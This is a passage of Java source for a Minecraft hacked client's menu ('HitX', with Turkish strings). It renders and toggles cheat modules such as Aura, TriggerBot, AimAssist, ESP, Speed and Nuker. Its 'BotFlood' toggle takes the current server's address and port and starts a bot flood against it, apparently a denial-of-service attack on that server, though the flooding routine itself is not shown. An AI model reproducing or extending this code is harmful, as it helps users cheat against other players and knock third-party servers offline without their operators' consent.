        private void renderCol(DrawContext ctx,MatrixStack ms,int mx,int my,int x,int y,String title,String[]tabs,String[]mods,int ci){
            int colW=(MW-8)/4-2;
            drawRoundedRect(ms,x,y,colW,MH-26,4f,0xFF0D0D12);
            float[]tc=cc(ci);int col=0xFF000000|((int)(tc[0]*255)<<16)|((int)(tc[1]*255)<<8)|(int)(tc[2]*255);
            ctx.drawCenteredTextWithShadow(textRenderer,title,x+colW/2,y+6,col);
            int tx=x+4,ty=y+18,tabW=(colW-8)/tabs.length;
            for(String t:tabs){boolean hov=hov(mx,my,tx,ty,tabW-2,14);drawRoundedRect(ms,tx,ty,tabW-2,14,3f,hov?0xFF2A0055:0xFF141420);ctx.drawCenteredTextWithShadow(textRenderer,t,tx+(tabW-2)/2,ty+3,hov?0xFFCC88FF:0xFF555566);tx+=tabW;}
            int my2=ty+18;
            for(String mod:mods){
                boolean on=isOn(mod);boolean hov=hov(mx,my,x+2,my2,colW-4,16);
                drawRoundedRect(ms,x+2,my2,colW-4,16,3f,on?0xFF140028:(hov?0xFF1A1A24:0xFF111118));
                if(on) ctx.fill(x+2,my2,x+4,my2+16,col);
                ctx.drawTextWithShadow(textRenderer,mod,x+8,my2+4,on?0xFFEEDDFF:(hov?0xFFBBBBCC:0xFF555566));
                if(on) ctx.drawTextWithShadow(textRenderer,"§a●",x+colW-14,my2+4,0xFFFFFFFF);
                my2+=18;
            }
        }

        private float[]cc(int c){return switch(c){case 0->new float[]{0.8f,0.4f,1f};case 1->new float[]{0.3f,0.8f,1f};case 2->new float[]{0.4f,1f,0.6f};default->new float[]{1f,0.7f,0.2f};};}
        private String[]getPvpMods(){return new String[]{"Anti Phase","Attribute Swap","Aura","Auto Base Place","Auto Crystal","Auto Dripstone","Auto Mine","Auto Netherite Scrap","Auto Sweet Berries","Auto Web","Criticals","Hole Filler","Mace Killer","More Knockback","Trap","AimAssist","TriggerBot","Hitboxes"};}
        private String[]getMovMods(){return new String[]{"Anti Knock Back","Avoid","Elytra Recast","Gui Move","Hole Anchor","Infinite Elytra","Legit Strafe","Move Fix","No Push","Sprint","Wind Hop","Speed","NoFall","AutoSprint","ElytraTarget"};}
        private String[]getVisMods(){return new String[]{"Absorption","Aspect","Buff Effect","Crystal Chams","Damage Particles","Damage Tint","Dismemberment","Free Look","Full Bright","Hand Chams","Hit Fx","No Camera Clip","Particles","Pop Chams","Sky Lanterns","Swing Animations","Throw Petard","Totem Animation","Trajectories","ESP","NightVision"};}
        private String[]getUtilMods(){return new String[]{"Auto Bone Meal","Auto Land","Auto Shear","Auto Sign","Auto Wither","Fake Player","Free Cam","No Render","Nuker","Pearl Chaser","Server Helper","Soil Ripper","Tps Sync","Zoom","AntiKB","BotFlood"};}
        private boolean isOn(String n){return switch(n){case"AimAssist"->aimAssistActive;case"TriggerBot"->triggerBotActive;case"Hitboxes"->hitBoxActive;case"Aura"->auraActive;case"ElytraTarget"->elytraTargetActive;case"ESP"->espActive;case"Speed"->speedActive;case"AutoSprint"->sprintActive;case"NoFall"->noFallActive;case"Full Bright"->fullBrightActive;case"NightVision"->nightVisionActive;case"Anti Knock Back","AntiKB"->antiKbActive;case"BotFlood"->botFloodActive;default->false;};}

        @Override
        public boolean mouseClicked(double mx,double my,int btn){
            int ox=ox(),oy=oy(),colW=(MW-8)/4;
            int[][]colX={{ox+2,0},{ox+2+colW,1},{ox+2+colW*2,2},{ox+2+colW*3,3}};
            String[][]allMods={getPvpMods(),getMovMods(),getVisMods(),getUtilMods()};
            for(int ci=0;ci<4;ci++){int cx=colX[ci][0],cw=(MW-8)/4-2,my2=oy+24+18+18;
                for(String mod:allMods[ci]){if(hovD(mx,my,cx+2,my2,cw-4,16)){toggle(mod);return true;}my2+=18;}}
            return super.mouseClicked(mx,my,btn);
        }

        private void toggle(String n){
            MinecraftClient c=MinecraftClient.getInstance();
            switch(n){
                case"AimAssist"->{aimAssistActive=!aimAssistActive;locked=null;bar(c,aimAssistActive?"§aAimAssist Acik":"§cAimAssist Kapali");}
                case"TriggerBot"->triggerBotActive=!triggerBotActive;
                case"Hitboxes"->hitBoxActive=!hitBoxActive;
                case"Aura"->{auraActive=!auraActive;auraLocked=null;bar(c,auraActive?"§aAura Acik":"§cAura Kapali");}
                case"ElytraTarget"->elytraTargetActive=!elytraTargetActive;
                case"ESP"->espActive=!espActive;
                case"Speed"->speedActive=!speedActive;
                case"AutoSprint"->sprintActive=!sprintActive;
                case"NoFall"->noFallActive=!noFallActive;
                case"Full Bright"->fullBrightActive=!fullBrightActive;
                case"NightVision"->{nightVisionActive=!nightVisionActive;if(!nightVisionActive&&c.player!=null)c.player.removeStatusEffect(StatusEffects.NIGHT_VISION);}
                case"Anti Knock Back","AntiKB"->antiKbActive=!antiKbActive;
                case"BotFlood"->{if(!botFloodActive&&c.getCurrentServerEntry()!=null){String ip=c.getCurrentServerEntry().address;int port=25565;if(ip.contains(":")){String[]sp=ip.split(":");try{port=Integer.parseInt(sp[1]);}catch(Exception ignored){}ip=sp[0];}startBotFlood(ip,port,botCount);}else botFloodActive=false;}
            }
        }

        @Override public boolean shouldPause(){return false;}
        private int ox(){return width/2-MW/2;}
        private int oy(){return height/2-MH/2;}
        private boolean hov(int mx,int my,int x,int y,int w,int h){return mx>=x&&mx<=x+w&&my>=y&&my<=y+h;}
        private boolean hovD(double mx,double my,double x,double y,double w,double h){return mx>=x&&mx<=x+w&&my>=y&&my<=y+h;}
    }

    // ── Yardımcılar ──────────────────────────────────────────
    private float angleTo(MinecraftClient c,LivingEntity t){Vec3d look=c.player.getRotationVec(1f);Vec3d toT=t.getEyePos().subtract(c.player.getEyePos()).normalize();return(float)Math.toDegrees(Math.acos(MathHelper.clamp(look.dotProduct(toT),-1.0,1.0)));}
    private boolean isEating(LivingEntity e){if(e==null||!e.isUsingItem()) return false;ItemStack u=e.getActiveItem();if(u.isEmpty()) return false;net.minecraft.item.Item item=u.getItem();return u.getComponents().contains(net.minecraft.component.DataComponentTypes.FOOD)||item==Items.MILK_BUCKET||item==Items.POTION||item==Items.SPLASH_POTION||item==Items.LINGERING_POTION;}
    private void bar(MinecraftClient c,String m){if(c.player!=null)c.player.sendMessage(Text.literal("§8[§dHitX§8] §r"+m),true);}
    private void iconBtn(Screen s,ItemStack i,String t,int x,int y,int w,int h,ButtonWidget.PressAction p){}
    private boolean isArmor(ItemStack s){return s.getItem() instanceof net.minecraft.item.ArmorItem;}
}
